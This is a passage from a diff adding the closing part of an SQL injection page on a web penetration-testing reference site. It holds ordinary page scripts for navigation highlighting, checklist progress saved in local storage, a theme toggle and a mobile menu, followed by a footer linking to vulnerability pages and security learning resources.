+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => observer.observe(s));
+
+// Checklist persistence
+const STORAGE_KEY = 'sqli-checklist';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  const saved = localStorage.getItem(STORAGE_KEY + i);
+  if (saved === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(STORAGE_KEY + i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(wrap => {
+    const all = wrap.querySelectorAll('input[type=checkbox]');
+    const done = wrap.querySelectorAll('input[type=checkbox]:checked');
+    const mini = wrap.querySelector('.progress-mini');
+    const bar = wrap.querySelector('.progress-bar');
+    if (mini) mini.textContent = done.length + '/' + all.length;
+    if (bar) bar.style.width = (all.length ? (done.length/all.length*100) : 0) + '%';
+  });
+}
+updateProgress();
+</script>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
